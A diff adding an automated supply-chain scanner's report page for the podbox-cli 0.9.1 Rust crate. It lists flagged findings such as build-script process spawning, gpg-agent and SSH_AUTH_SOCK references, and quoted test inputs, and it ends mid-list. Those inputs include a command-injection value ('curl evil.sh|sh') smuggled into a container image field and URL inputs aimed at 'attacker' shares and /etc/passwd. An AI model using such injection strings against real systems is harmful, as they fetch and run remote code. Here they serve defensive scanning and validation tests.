@@ -1,0 +1,1015 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Crateward: podbox-cli 0.9.1</title>
+<link rel="stylesheet" href="../static/crateward.css">
+</head>
+<body>
+<header>
+  <a class="brand" href="../index.html">Crateward</a>
+  <nav class="primary" aria-label="Main"><a href="../index.html">Archive</a></nav>
+</header>
+<main>
+
+<div class="report-head">
+  <div class="report-title">
+    <h1>podbox-cli <span class="version">0.9.1</span></h1>
+    <p class="meta">
+      <span class="badge">Done</span>
+      <span class="badge">dynamic on Linux</span>
+      <span class="muted">job 268535</span>
+      <a class="muted" href="https://crates.io/crates/podbox-cli/0.9.1" rel="noreferrer noopener" target="_blank">crates.io</a>
+      <a class="muted" href="268535.cdx.json" download title="CycloneDX SBOM of the crate and its locked dependencies">SBOM</a>
+      <a class="muted" href="268535.vex.cdx.json" download title="Crateward's findings as CycloneDX VEX, pointing into the SBOM">Findings (VEX)</a>
+      
+    </p>
+    <p class="headline">medium severity process_spawn in build_script code (85 places): std::process::Command::new</p>
+  </div>
+  
+  <div class="verdict tone-low">
+    <div class="score">19</div>
+    <div class="level">low</div>
+  </div>
+  
+</div>
+
+
+<div class="decision">
+  <span><b>Automated verdict.</b> Nobody reviewed it. A score is a reason to look closer, not a finding.</span>
+</div>
+
+
+<nav class="toc" aria-label="Sections">
+  
+  <a href="#evidence">Evidence <span class="count">6</span></a>
+  <a href="#behavior">Behavior <span class="count">5</span></a>
+  <a href="#findings">Static findings <span class="count">148</span></a>
+  <a href="#run-check">Run: check</a>
+  <a href="#timeline">Timeline <span class="count">6</span></a>
+</nav>
+
+
+
+<h2 id="evidence">Evidence</h2>
+
+
+<table class="evidence">
+<thead><tr><th class="num">Points</th><th>Signal</th><th>Where</th><th>What</th></tr></thead>
+<tbody>
+
+<tr><td class="num"><span class="points warn">10</span></td><td class="signal"><span class="word">static:process_spawn</span><div class="sub">static · podbox-cli</div></td><td class="mono where"><a href="https://crates.io/crates/podbox-cli/0.9.1/code/build.rs#L35" rel="noreferrer noopener" target="_blank">build.rs:35</a></td><td>medium severity process_spawn in build_script code (85 places): std::process::Command::new</td></tr>
+
+<tr><td class="num"><span class="points low">2</span></td><td class="signal"><span class="word">static:credential_access</span><div class="sub">static · podbox-cli</div></td><td class="mono where"><a href="https://crates.io/crates/podbox-cli/0.9.1/code/src/env.rs#L85" rel="noreferrer noopener" target="_blank">src/env.rs:85</a></td><td>medium severity credential_access in library code (2 places): /home/user/.gnupg/S.gpg-agent</td></tr>
+
+<tr><td class="num"><span class="points low">2</span></td><td class="signal"><span class="word">static:environment_enumeration</span><div class="sub">static · podbox-cli</div></td><td class="mono where"><a href="https://crates.io/crates/podbox-cli/0.9.1/code/src/commands/runtime.rs#L117" rel="noreferrer noopener" target="_blank">src/commands/runtime.rs:117</a></td><td>medium severity environment_enumeration in library code: std::env::vars</td></tr>
+
+<tr><td class="num"><span class="points low">2</span></td><td class="signal"><span class="word">static:secret_environment_variable</span><div class="sub">static · podbox-cli</div></td><td class="mono where"><a href="https://crates.io/crates/podbox-cli/0.9.1/code/src/config/schema/tests/parse.rs#L58" rel="noreferrer noopener" target="_blank">src/config/schema/tests/parse.rs:58</a></td><td>medium severity secret_environment_variable in library code (3 places): SSH_AUTH_SOCK</td></tr>
+
+<tr><td class="num"><span class="points low">2</span></td><td class="signal"><span class="word">static:shell_command</span><div class="sub">static · podbox-cli</div></td><td class="mono where"><a href="https://crates.io/crates/podbox-cli/0.9.1/code/src/codegen/containerfile.rs#L124" rel="noreferrer noopener" target="_blank">src/codegen/containerfile.rs:124</a></td><td>medium severity shell_command in library code (5 places): RUN chmod +x /usr/local/bin/podbox-guest</td></tr>
+
+<tr><td class="num"><span class="points low">1</span></td><td class="signal"><span class="word">static:build_script</span><div class="sub">static · podbox-cli</div></td><td class="mono where"><a href="https://crates.io/crates/podbox-cli/0.9.1/code/build.rs" rel="noreferrer noopener" target="_blank">build.rs</a></td><td>low severity build_script in build_script code: build.rs</td></tr>
+
+</tbody>
+</table>
+
+
+
+
+<h2 id="behavior">Behavior</h2>
+<div class="behavior">
+
+<div><h4>Profile</h4>
+<p class="chips"><code class="chip">static:credential_access</code> <code class="chip">static:environment_enumeration</code> <code class="chip">static:process_spawn</code> <code class="chip">static:secret_environment_variable</code> <code class="chip">static:shell_command</code> </p></div>
+</div>
+
+<h2 id="findings">Static findings</h2>
+
+<div class="findings">
+<div class="filter" role="radiogroup" aria-label="Severity">
+  <input type="radio" name="severity" id="sev-all" checked><label for="sev-all">All <span class="count">148</span></label>
+  
+  <input type="radio" name="severity" id="sev-medium"><label for="sev-medium" class="tone-medium">medium <span class="count">15</span></label>
+  <input type="radio" name="severity" id="sev-low"><label for="sev-low" class="tone-low">low <span class="count">86</span></label>
+  <input type="radio" name="severity" id="sev-info"><label for="sev-info" class="tone-info">info <span class="count">47</span></label>
+  <span class="muted">14 groups</span>
+</div>
+
+
+<details class="group sev-medium">
+<summary><span class="badge tone-medium">medium</span> <span class="kind">shell_command</span> <span class="context">library</span> <span class="count">5</span></summary>
+<ul class="items">
+
+<li><code class="evidence-text">RUN chmod +x /usr/local/bin/podbox-guest</code>
+<span class="places"><a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/codegen/containerfile.rs#L124" rel="noreferrer noopener" target="_blank">src/codegen/containerfile.rs:124</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/codegen/containerfile.rs#L604" rel="noreferrer noopener" target="_blank">src/codegen/containerfile.rs:604</a> </span></li>
+
+<li><code class="evidence-text">RUN chmod +x /usr/local/bin/{}</code>
+<span class="places"><a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/codegen/containerfile.rs#L365" rel="noreferrer noopener" target="_blank">src/codegen/containerfile.rs:365</a> </span></li>
+
+<li><code class="evidence-text">ghcr.io/a/b:1 --name x; curl evil.sh|sh #</code>
+<span class="places"><a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/config/validation.rs#L1111" rel="noreferrer noopener" target="_blank">src/config/validation.rs:1111</a> </span></li>
+
+<li><code class="evidence-text">[image]\u{a}base = &#34;fedora:41&#34;\u{a}name = &#34;env&#34;\u{a}image = &#34;ghcr.io/a/b:1 --name x; curl evil.sh|sh #&#34;\u{a}[container]\u{a}name = &#34;env&#34;\u{a}home = &#34;~/env&#34;\u{a}</code>
+<span class="places"><a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/config/validation.rs#L1136" rel="noreferrer noopener" target="_blank">src/config/validation.rs:1136</a> </span></li>
+
+</ul>
+</details>
+
+<details class="group sev-medium">
+<summary><span class="badge tone-medium">medium</span> <span class="kind">process_spawn</span> <span class="context">build_script</span> <span class="count">4</span></summary>
+<ul class="items">
+
+<li><code class="evidence-text">std::process::Command::new</code>
+<span class="places"><a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/build.rs#L35" rel="noreferrer noopener" target="_blank">build.rs:35</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/build.rs#L100" rel="noreferrer noopener" target="_blank">build.rs:100</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/build.rs#L111" rel="noreferrer noopener" target="_blank">build.rs:111</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/build.rs#L128" rel="noreferrer noopener" target="_blank">build.rs:128</a> </span></li>
+
+</ul>
+</details>
+
+<details class="group sev-medium">
+<summary><span class="badge tone-medium">medium</span> <span class="kind">credential_access</span> <span class="context">library</span> <span class="count">2</span></summary>
+<ul class="items">
+
+<li><code class="evidence-text">/home/user/.gnupg/S.gpg-agent</code>
+<span class="places"><a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/env.rs#L85" rel="noreferrer noopener" target="_blank">src/env.rs:85</a> </span></li>
+
+<li><code class="evidence-text">/home/user/.gnupg</code>
+<span class="places"><a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/env.rs#L86" rel="noreferrer noopener" target="_blank">src/env.rs:86</a> </span></li>
+
+</ul>
+</details>
+
+<details class="group sev-medium">
+<summary><span class="badge tone-medium">medium</span> <span class="kind">secret_environment_variable</span> <span class="context">library</span> <span class="count">2</span></summary>
+<ul class="items">
+
+<li><code class="evidence-text">SSH_AUTH_SOCK</code>
+<span class="places"><a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/config/schema/tests/parse.rs#L58" rel="noreferrer noopener" target="_blank">src/config/schema/tests/parse.rs:58</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/env.rs#L182" rel="noreferrer noopener" target="_blank">src/env.rs:182</a> </span></li>
+
+</ul>
+</details>
+
+<details class="group sev-medium">
+<summary><span class="badge tone-medium">medium</span> <span class="kind">environment_enumeration</span> <span class="context">library</span> <span class="count">1</span></summary>
+<ul class="items">
+
+<li><code class="evidence-text">std::env::vars</code>
+<span class="places"><a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/commands/runtime.rs#L117" rel="noreferrer noopener" target="_blank">src/commands/runtime.rs:117</a> </span></li>
+
+</ul>
+</details>
+
+<details class="group sev-medium">
+<summary><span class="badge tone-medium">medium</span> <span class="kind">secret_environment_variable</span> <span class="context">test</span> <span class="count">1</span></summary>
+<ul class="items">
+
+<li><code class="evidence-text">SSH_AUTH_SOCK</code>
+<span class="places"><a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/tests/codegen_env.rs#L27" rel="noreferrer noopener" target="_blank">tests/codegen_env.rs:27</a> </span></li>
+
+</ul>
+</details>
+
+<details class="group sev-low">
+<summary><span class="badge tone-low">low</span> <span class="kind">process_spawn</span> <span class="context">library</span> <span class="count">65</span></summary>
+<ul class="items">
+
+<li><code class="evidence-text">std::process::Command::new</code>
+<span class="places"><a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/build/prebuilt.rs#L125" rel="noreferrer noopener" target="_blank">src/build/prebuilt.rs:125</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/build/prebuilt.rs#L210" rel="noreferrer noopener" target="_blank">src/build/prebuilt.rs:210</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/commands/create.rs#L426" rel="noreferrer noopener" target="_blank">src/commands/create.rs:426</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/commands/dotfiles.rs#L106" rel="noreferrer noopener" target="_blank">src/commands/dotfiles.rs:106</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/commands/dotfiles.rs#L115" rel="noreferrer noopener" target="_blank">src/commands/dotfiles.rs:115</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/commands/dotfiles.rs#L132" rel="noreferrer noopener" target="_blank">src/commands/dotfiles.rs:132</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/commands/dotfiles.rs#L162" rel="noreferrer noopener" target="_blank">src/commands/dotfiles.rs:162</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/commands/dotfiles.rs#L312" rel="noreferrer noopener" target="_blank">src/commands/dotfiles.rs:312</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/commands/lifecycle.rs#L499" rel="noreferrer noopener" target="_blank">src/commands/lifecycle.rs:499</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/commands/provision.rs#L317" rel="noreferrer noopener" target="_blank">src/commands/provision.rs:317</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/commands/pull.rs#L22" rel="noreferrer noopener" target="_blank">src/commands/pull.rs:22</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/commands/pull.rs#L38" rel="noreferrer noopener" target="_blank">src/commands/pull.rs:38</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/commands/runtime/doctor/container.rs#L91" rel="noreferrer noopener" target="_blank">src/commands/runtime/doctor/container.rs:91</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/commands/runtime/doctor/container.rs#L104" rel="noreferrer noopener" target="_blank">src/commands/runtime/doctor/container.rs:104</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/commands/runtime/doctor/fix.rs#L19" rel="noreferrer noopener" target="_blank">src/commands/runtime/doctor/fix.rs:19</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/commands/runtime/doctor/fix.rs#L93" rel="noreferrer noopener" target="_blank">src/commands/runtime/doctor/fix.rs:93</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/commands/runtime/doctor/integration/secrets.rs#L11" rel="noreferrer noopener" target="_blank">src/commands/runtime/doctor/integration/secrets.rs:11</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/commands/runtime/doctor/integration/x11.rs#L42" rel="noreferrer noopener" target="_blank">src/commands/runtime/doctor/integration/x11.rs:42</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/commands/runtime/git_bridge.rs#L309" rel="noreferrer noopener" target="_blank">src/commands/runtime/git_bridge.rs:309</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/commands/runtime/watchdog.rs#L43" rel="noreferrer noopener" target="_blank">src/commands/runtime/watchdog.rs:43</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/diff.rs#L89" rel="noreferrer noopener" target="_blank">src/diff.rs:89</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/editor.rs#L85" rel="noreferrer noopener" target="_blank">src/editor.rs:85</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/export.rs#L89" rel="noreferrer noopener" target="_blank">src/export.rs:89</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/labels.rs#L10" rel="noreferrer noopener" target="_blank">src/labels.rs:10</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/podman.rs#L43" rel="noreferrer noopener" target="_blank">src/podman.rs:43</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/podman.rs#L52" rel="noreferrer noopener" target="_blank">src/podman.rs:52</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/podman.rs#L265" rel="noreferrer noopener" target="_blank">src/podman.rs:265</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/podman.rs#L273" rel="noreferrer noopener" target="_blank">src/podman.rs:273</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/podman.rs#L311" rel="noreferrer noopener" target="_blank">src/podman.rs:311</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/podman.rs#L326" rel="noreferrer noopener" target="_blank">src/podman.rs:326</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/podman.rs#L338" rel="noreferrer noopener" target="_blank">src/podman.rs:338</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/podman.rs#L396" rel="noreferrer noopener" target="_blank">src/podman.rs:396</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/process.rs#L23" rel="noreferrer noopener" target="_blank">src/process.rs:23</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/process.rs#L31" rel="noreferrer noopener" target="_blank">src/process.rs:31</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/process.rs#L46" rel="noreferrer noopener" target="_blank">src/process.rs:46</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/process.rs#L130" rel="noreferrer noopener" target="_blank">src/process.rs:130</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/process.rs#L184" rel="noreferrer noopener" target="_blank">src/process.rs:184</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/process.rs#L202" rel="noreferrer noopener" target="_blank">src/process.rs:202</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/process.rs#L474" rel="noreferrer noopener" target="_blank">src/process.rs:474</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/quadlet_install/preflight.rs#L145" rel="noreferrer noopener" target="_blank">src/quadlet_install/preflight.rs:145</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/socket_host.rs#L763" rel="noreferrer noopener" target="_blank">src/socket_host.rs:763</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/socket_host.rs#L768" rel="noreferrer noopener" target="_blank">src/socket_host.rs:768</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/socket_host.rs#L785" rel="noreferrer noopener" target="_blank">src/socket_host.rs:785</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/socket_host/actions.rs#L121" rel="noreferrer noopener" target="_blank">src/socket_host/actions.rs:121</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/socket_host/actions.rs#L162" rel="noreferrer noopener" target="_blank">src/socket_host/actions.rs:162</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/socket_host/handlers.rs#L389" rel="noreferrer noopener" target="_blank">src/socket_host/handlers.rs:389</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/socket_host/handlers.rs#L592" rel="noreferrer noopener" target="_blank">src/socket_host/handlers.rs:592</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/systemd/status.rs#L22" rel="noreferrer noopener" target="_blank">src/systemd/status.rs:22</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/systemd/status.rs#L69" rel="noreferrer noopener" target="_blank">src/systemd/status.rs:69</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/systemd/units.rs#L21" rel="noreferrer noopener" target="_blank">src/systemd/units.rs:21</a> <span class="muted">and 11 more</span></span></li>
+
+<li><code class="evidence-text">std::process::Command</code>
+<span class="places"><a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/commands/dotfiles.rs#L40" rel="noreferrer noopener" target="_blank">src/commands/dotfiles.rs:40</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/process.rs#L210" rel="noreferrer noopener" target="_blank">src/process.rs:210</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/process.rs#L217" rel="noreferrer noopener" target="_blank">src/process.rs:217</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/socket_host/handlers.rs#L674" rel="noreferrer noopener" target="_blank">src/socket_host/handlers.rs:674</a> </span></li>
+
+</ul>
+</details>
+
+<details class="group sev-low">
+<summary><span class="badge tone-low">low</span> <span class="kind">process_spawn</span> <span class="context">test</span> <span class="count">16</span></summary>
+<ul class="items">
+
+<li><code class="evidence-text">std::process::Command</code>
+<span class="places"><a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/tests/cli_contract.rs#L58" rel="noreferrer noopener" target="_blank">tests/cli_contract.rs:58</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/tests/cli_contract.rs#L240" rel="noreferrer noopener" target="_blank">tests/cli_contract.rs:240</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/tests/cli_help.rs#L10" rel="noreferrer noopener" target="_blank">tests/cli_help.rs:10</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/tests/golden.rs#L54" rel="noreferrer noopener" target="_blank">tests/golden.rs:54</a> </span></li>
+
+<li><code class="evidence-text">std::process::Command::cargo_bin</code>
+<span class="places"><a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/tests/cli_contract.rs#L59" rel="noreferrer noopener" target="_blank">tests/cli_contract.rs:59</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/tests/cli_help.rs#L11" rel="noreferrer noopener" target="_blank">tests/cli_help.rs:11</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/tests/dry_run.rs#L15" rel="noreferrer noopener" target="_blank">tests/dry_run.rs:15</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/tests/dry_run.rs#L30" rel="noreferrer noopener" target="_blank">tests/dry_run.rs:30</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/tests/dry_run.rs#L45" rel="noreferrer noopener" target="_blank">tests/dry_run.rs:45</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/tests/dry_run.rs#L60" rel="noreferrer noopener" target="_blank">tests/dry_run.rs:60</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/tests/dry_run.rs#L77" rel="noreferrer noopener" target="_blank">tests/dry_run.rs:77</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/tests/dry_run.rs#L94" rel="noreferrer noopener" target="_blank">tests/dry_run.rs:94</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/tests/dry_run.rs#L108" rel="noreferrer noopener" target="_blank">tests/dry_run.rs:108</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/tests/golden.rs#L55" rel="noreferrer noopener" target="_blank">tests/golden.rs:55</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/tests/name_validation.rs#L22" rel="noreferrer noopener" target="_blank">tests/name_validation.rs:22</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/tests/sandbox/mod.rs#L91" rel="noreferrer noopener" target="_blank">tests/sandbox/mod.rs:91</a> </span></li>
+
+</ul>
+</details>
+
+<details class="group sev-low">
+<summary><span class="badge tone-low">low</span> <span class="kind">network_access</span> <span class="context">library</span> <span class="count">4</span></summary>
+<ul class="items">
+
+<li><code class="evidence-text">std::net::TcpListener::bind</code>
+<span class="places"><a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/ports.rs#L70" rel="noreferrer noopener" target="_blank">src/ports.rs:70</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/ports.rs#L107" rel="noreferrer noopener" target="_blank">src/ports.rs:107</a> </span></li>
+
+<li><code class="evidence-text">std::net::UdpSocket::bind</code>
+<span class="places"><a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/ports.rs#L71" rel="noreferrer noopener" target="_blank">src/ports.rs:71</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/ports.rs#L118" rel="noreferrer noopener" target="_blank">src/ports.rs:118</a> </span></li>
+
+</ul>
+</details>
+
+<details class="group sev-low">
+<summary><span class="badge tone-low">low</span> <span class="kind">build_script</span> <span class="context">build_script</span> <span class="count">1</span></summary>
+<ul class="items">
+
+<li><code class="evidence-text">build.rs</code>
+<span class="places"><a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/build.rs" rel="noreferrer noopener" target="_blank">build.rs</a> </span></li>
+
+</ul>
+</details>
+
+<details class="group sev-info">
+<summary><span class="badge tone-info">info</span> <span class="kind">url_literal</span> <span class="context">library</span> <span class="count">29</span></summary>
+<ul class="items">
+
+<li><code class="evidence-text">file://x</code>
+<span class="places"><a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/config/schema/tests/xdg_open.rs#L121" rel="noreferrer noopener" target="_blank">src/config/schema/tests/xdg_open.rs:121</a> </span></li>
+
+<li><code class="evidence-text">https://example.com</code>
+<span class="places"><a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/socket_host.rs#L270" rel="noreferrer noopener" target="_blank">src/socket_host.rs:270</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/socket_host.rs#L270" rel="noreferrer noopener" target="_blank">src/socket_host.rs:270</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/socket_host.rs#L380" rel="noreferrer noopener" target="_blank">src/socket_host.rs:380</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/socket_host.rs#L385" rel="noreferrer noopener" target="_blank">src/socket_host.rs:385</a> </span></li>
+
+<li><code class="evidence-text">http://example.com</code>
+<span class="places"><a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/socket_host.rs#L271" rel="noreferrer noopener" target="_blank">src/socket_host.rs:271</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/socket_host.rs#L271" rel="noreferrer noopener" target="_blank">src/socket_host.rs:271</a> </span></li>
+
+<li><code class="evidence-text">smb://attacker/share</code>
+<span class="places"><a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/socket_host.rs#L278" rel="noreferrer noopener" target="_blank">src/socket_host.rs:278</a> </span></li>
+
+<li><code class="evidence-text">archive://file%3A%2F%2F%2Fhome%2Fuser</code>
+<span class="places"><a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/socket_host.rs#L279" rel="noreferrer noopener" target="_blank">src/socket_host.rs:279</a> </span></li>
+
+<li><code class="evidence-text">trash:///</code>
+<span class="places"><a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/socket_host.rs#L280" rel="noreferrer noopener" target="_blank">src/socket_host.rs:280</a> </span></li>
+
+<li><code class="evidence-text">recent:///</code>
+<span class="places"><a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/socket_host.rs#L281" rel="noreferrer noopener" target="_blank">src/socket_host.rs:281</a> </span></li>
+
+<li><code class="evidence-text">computer:///</code>
+<span class="places"><a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/socket_host.rs#L282" rel="noreferrer noopener" target="_blank">src/socket_host.rs:282</a> </span></li>
+
+<li><code class="evidence-text">steam://run/1</code>
+<span class="places"><a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/socket_host.rs#L283" rel="noreferrer noopener" target="_blank">src/socket_host.rs:283</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/socket_host.rs#L311" rel="noreferrer noopener" target="_blank">src/socket_host.rs:311</a> </span></li>
+
+<li><code class="evidence-text">vscode://file/etc/passwd</code>
+<span class="places"><a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/socket_host.rs#L284" rel="noreferrer noopener" target="_blank">src/socket_host.rs:284</a> </span></li>
+
+<li><code class="evidence-text">sftp://host/</code>
+<span class="places"><a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/socket_host.rs#L285" rel="noreferrer noopener" target="_blank">src/socket_host.rs:285</a> </span></li>
+
+<li><code class="evidence-text">davs://host/</code>
+<span class="places"><a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/socket_host.rs#L286" rel="noreferrer noopener" target="_blank">src/socket_host.rs:286</a> </span></li>
+
+<li><code class="evidence-text">file:///etc/passwd</code>
+<span class="places"><a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/socket_host.rs#L287" rel="noreferrer noopener" target="_blank">src/socket_host.rs:287</a> </span></li>
+
+<li><code class="evidence-text">FILE:///etc/passwd</code>
+<span class="places"><a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/socket_host.rs#L288" rel="noreferrer noopener" target="_blank">src/socket_host.rs:288</a> </span></li>
+
+<li><code class="evidence-text">smb://host/share</code>
+<span class="places"><a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/socket_host.rs#L306" rel="noreferrer noopener" target="_blank">src/socket_host.rs:306</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/socket_host.rs#L307" rel="noreferrer noopener" target="_blank">src/socket_host.rs:307</a> </span></li>
+
+<li><code class="evidence-text">SMB://host/share</code>
+<span class="places"><a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/socket_host.rs#L318" rel="noreferrer noopener" target="_blank">src/socket_host.rs:318</a> </span></li>
+
+<li><code class="evidence-text">https://</code>
+<span class="places"><a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/socket_host.rs#L331" rel="noreferrer noopener" target="_blank">src/socket_host.rs:331</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/socket_host.rs#L373" rel="noreferrer noopener" target="_blank">src/socket_host.rs:373</a> </span></li>
+
+<li><code class="evidence-text">https://example.com/\u{a}rm</code>
+<span class="places"><a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/socket_host.rs#L356" rel="noreferrer noopener" target="_blank">src/socket_host.rs:356</a> </span></li>
+
+<li><code class="evidence-text">https://example.com/\u{0}</code>
+<span class="places"><a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/socket_host.rs#L360" rel="noreferrer noopener" target="_blank">src/socket_host.rs:360</a> </span></li>
+
+<li><code class="evidence-text">https://example.com/{}</code>
+<span class="places"><a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/socket_host.rs#L363" rel="noreferrer noopener" target="_blank">src/socket_host.rs:363</a> </span></li>
+
+<li><code class="evidence-text">  https://example.com  </code>
+<span class="places"><a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/socket_host.rs#L385" rel="noreferrer noopener" target="_blank">src/socket_host.rs:385</a> </span></li>
+
+<li><code class="evidence-text">https://{s}</code>
+<span class="places"><a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/socket_host/handlers.rs#L203" rel="noreferrer noopener" target="_blank">src/socket_host/handlers.rs:203</a> </span></li>
+
+</ul>
+</details>
+
+<details class="group sev-info">
+<summary><span class="badge tone-info">info</span> <span class="kind">url_literal</span> <span class="context">test</span> <span class="count">13</span></summary>
+<ul class="items">
+
+<li><code class="evidence-text">https://example.com</code>
